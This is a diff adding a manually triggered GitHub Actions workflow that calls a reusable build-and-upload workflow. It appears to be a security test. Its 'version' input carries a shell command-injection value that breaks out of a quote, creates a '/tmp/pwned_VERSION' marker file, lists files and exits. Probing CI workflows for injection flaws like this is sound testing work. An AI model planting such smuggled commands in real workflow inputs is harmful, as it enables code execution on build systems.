@@ -1,0 +1,16 @@
+name: argus-call-17
+on:
+  workflow_dispatch:
+jobs:
+  call:
+    uses: ./.github/workflows/build-and-upload.yml
+    with:
+      ref: ""
+      version: "x\"; touch /tmp/pwned_VERSION; ls; exit 1; #"
+      tag: ""
+      release_name: ""
+      upload: "true"
+      upload_actions_artifacts: "false"
+      actions_artifacts_retention_days: "7"
+      actions_artifacts_name_prefix: ""
+      set_versions: "true"
